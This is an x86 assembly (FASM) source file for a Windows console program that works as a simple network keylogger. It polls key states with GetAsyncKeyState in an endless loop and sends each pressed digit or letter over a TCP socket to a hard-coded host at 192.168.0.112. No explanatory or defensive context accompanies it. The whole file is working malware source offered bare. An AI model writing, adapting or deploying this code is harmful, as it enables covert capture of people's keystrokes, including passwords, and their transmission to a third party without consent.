format PE CONSOLE
entry start
include 'win32ax.inc'
include 'api\kernel32.inc'
include 'api\wsock32.inc'

section '.code' code readable executable
    start:
      macro checkerr {
      local nerr
      test eax, eax
      jz nerr
      prints strerr
      nerr:
    }
    macro prints s {
      cinvoke printf, formats, s
    }

    invoke WSAStartup, 514, wsa
    checkerr
    invoke socket, AF_INET, SOCK_STREAM, 0
    mov [sock], eax
    mov [saddr.sin_port], 24606
    invoke inet_addr, addr
    mov [saddr.sin_addr], eax
    mov [saddr.sin_family], AF_INET
    invoke connect, [sock], saddr, sizeof.sockaddr
    ns:
    mov ecx, 0x2B
    keys:
      mov [tcx], ecx
      mov ebx, ecx
      add ebx, 0x30
      push ebx
      call [GetAsyncKeyState]
      test eax, 1
      jz contkeys
      mov ebx, [tcx]
      add ebx, 0x30
      mov [buf], bl
      invoke send, [sock], buf, 2, 0
      prints buf
      contkeys:
	mov ecx, [tcx]
	dec ecx
	cmp ecx, 0
	jge keys
  jmp ns

section '.data' data readable writable
  format1 db '%c', 13,10,0
  addr db "192.168.0.112", 0
  strerr db "Error"
  formats db "%s",13,10,0
  saddr sockaddr_in
  buf db 0,0
  wsa WSADATA
  sock dd ?
  tcx dd 0

section '.idata' import data readable writable
  library msvcrt, 'msvcrt.dll',\
	  kernel32, 'kernel32.dll',\
	  user32, 'user32.dll',\
	  ws2_32, 'ws2_32.dll'
  import msvcrt, printf, 'printf',\
		 malloc, 'malloc'
  import user32, GetAsyncKeyState, 'GetAsyncKeyState'
  import ws2_32, WSAStartup, 'WSAStartup',\
		 socket, 'socket',\
		 connect, 'connect',\
		 send, 'send',\
		 closesocket, 'closesocket',\
		 recv, 'recv',\
		 inet_addr, 'inet_addr'
